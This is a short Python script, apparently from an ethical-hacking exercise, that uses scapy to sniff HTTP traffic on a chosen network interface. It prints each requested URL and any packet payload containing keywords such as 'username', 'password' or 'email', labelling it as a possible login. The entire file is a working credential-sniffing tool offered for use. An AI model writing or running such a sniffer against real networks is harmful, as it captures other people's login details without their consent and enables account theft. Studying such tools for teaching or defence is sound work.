#! usr/bin/env python
import optparse

import scapy.all as scapy
from scapy.layers import http


def get_argument():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface to see flowing data")
    (option, argument) = parser.parse_args()
    if not option.interface:
        parser.error("[-] Please specify an INTERFACE, use --help for more info.")
    else:
        return option


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        if packet[scapy.Raw].load:
            load = packet[scapy.Raw].load
            keywords = ["username", "uname", "pass", "password", "user", "pass", "email", "gmail"]
            for key in keywords:
                if key in load:
                    return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+]HTTP Request >> " + "http://" + url)
        login_info = get_login_info(packet)
        if login_info:
            # print(packet.show())
            print("\n\n[+] Possible Username/Password >> " + login_info + "\n\n")


option = get_argument()

sniff(option.interface)
